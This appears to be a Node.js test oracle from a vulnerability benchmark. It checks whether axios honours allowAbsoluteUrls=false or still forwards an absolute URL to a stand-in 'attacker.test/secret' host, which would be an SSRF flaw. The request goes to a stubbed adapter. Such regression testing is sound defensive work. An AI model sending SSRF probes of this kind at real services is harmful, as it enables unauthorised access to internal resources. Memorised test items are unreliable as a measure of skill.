const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = `axios-ssrf-oracle-${process.pid}-${Date.now()}`;
    const tmpDir = path.join(os.tmpdir(), marker);
    fs.mkdirSync(tmpDir, { recursive: true });

    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    // Benign operation must succeed first.
    let benignFinalUri = '';
    try {
      const benignRes = await axios.get('/ok', {
        baseURL: 'http://example.test/api/',
        adapter: async (config) => {
          benignFinalUri = config && config.url ? String(config.url) : '';
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!benignRes || benignRes.status !== 200) {
        throw new Error('benign_bad_status');
      }
      if (!benignFinalUri.includes('/ok')) {
        throw new Error('benign_bad_url');
      }
      evidence += `benign_url=${benignFinalUri};`;
    } catch (e) {
      const msg = String((e && e.message) || e);
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: `benign_failed:${msg.slice(0, 200)}`
      }));
      return;
    }

    operation_completed = true;

    // SSRF regression check:
    // with allowAbsoluteUrls=false and a baseURL set, absolute URLs should be blocked by patched versions.
    // Vulnerable versions still allow the absolute URL and pass it to adapter.
    const instance = axios.create({
      baseURL: 'http://example.test/api/',
      allowAbsoluteUrls: false
    });

    let maliciousAdapterCalled = false;
    let seenUrl = '';

    try {
      await instance.get('http://attacker.test/secret', {
        adapter: async (config) => {
          maliciousAdapterCalled = true;
          seenUrl = config && config.url ? String(config.url) : '';
          return {
            data: 'x',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (maliciousAdapterCalled) {
        exploit_succeeded = true;
        evidence += `malicious_allowed:url=${seenUrl || 'unknown'};`;
      } else {
        exploit_succeeded = false;
        evidence += 'malicious_blocked_without_adapter;';
      }
    } catch (e) {
      const msg = String((e && e.message) || e);
      if (maliciousAdapterCalled) {
        exploit_succeeded = true;
        evidence += `malicious_adapter_called_then_error:url=${seenUrl || 'unknown'};err=${msg.slice(0, 120)};`;
      } else {
        exploit_succeeded = false;
        evidence += `malicious_blocked:${msg.slice(0, 160)};`;
      }
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: `setup_or_runtime_error:${msg.slice(0, 200)}`
    }));
  }
})();